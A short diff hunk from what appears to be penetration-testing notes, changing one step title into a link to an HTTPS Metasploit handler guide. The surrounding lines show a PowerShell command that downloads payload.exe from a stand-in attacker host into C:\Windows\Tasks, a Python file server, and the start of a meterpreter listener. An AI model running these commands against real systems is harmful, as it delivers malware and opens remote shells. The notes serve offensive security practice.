@@ -218,7 +218,7 @@ python -m SimpleHTTPServer 80
 ```powershell
 PS C:\> IEX (New-Object Net.WebClient).DownloadFile('http://[Attack Host]/payload.exe', 'C:\Windows\Tasks\payload.exe')
 ```
-* Start meterpreter listener.
+* [Start HTTPS meterpreter listener](../../../../Tools/Metasploit/README.md#HTTPS-Handler-with-PEM).
 ```bash
 msfconsole
 use exploit/multi/handler
